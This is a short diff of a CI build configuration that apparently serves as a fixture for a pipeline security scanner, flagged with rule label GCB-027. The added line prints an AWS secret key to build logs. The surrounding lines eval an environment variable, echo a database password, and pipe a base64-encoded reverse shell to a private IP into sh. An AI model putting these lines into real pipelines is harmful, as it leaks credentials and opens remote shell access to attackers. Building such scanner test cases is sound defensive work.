@@ -75,6 +75,7 @@ steps:
         pip install git+https://example.com/internal/tooling.git
         eval "$BUILD_CMD"
         echo "deploying to $_DEPLOY_TARGET with $DB_PASS"
+        echo "key is $AWS_SECRET_ACCESS_KEY"
         # GCB-027: obfuscated base64-decoded execution (malicious indicator).
         echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | sh
 
